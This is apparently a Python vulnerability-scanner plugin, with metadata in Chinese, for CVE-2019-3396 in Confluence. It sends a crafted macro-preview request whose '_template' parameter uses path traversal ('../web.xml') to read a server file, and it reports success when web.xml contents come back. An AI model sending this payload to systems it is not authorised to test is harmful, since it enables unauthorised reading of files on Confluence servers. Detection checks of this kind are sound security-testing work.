#!/usr/bin/env python
#coding=utf-8
import requests

def get_plugin_info():
    plugin_info = {
        "info": "Confluence在6.14.2版本前存在一处未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令。",
        "source": 1,
        "name": "Confluence任意文件读取(CVE-2019-3396)",
        "keyword": "server:web",
        "level": "中危",
        "url": "https://vulhub.org/#/environments/confluence/CVE-2019-3396/",
        "author": "zinc",
        "type": "任意文件读取"
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        target = 'http://%s:%d' % (ip, port)
        url = target +'/rest/tinymce/1/macro/preview'
        headers = {
            'Referer': target + '/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&',
            'Content-Type': 'application/json; charset=utf-8'
        }
        data = '{"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}'
        r = requests.post(url, data=data, headers=headers)
        if 'web-app xlmns' in r.content and 'display-name' in r.content:
            return u'任意文件读取'
    except Exception as e:
        print e
 
if __name__ == '__main__':
   check('127.0.0.1', 80, 3)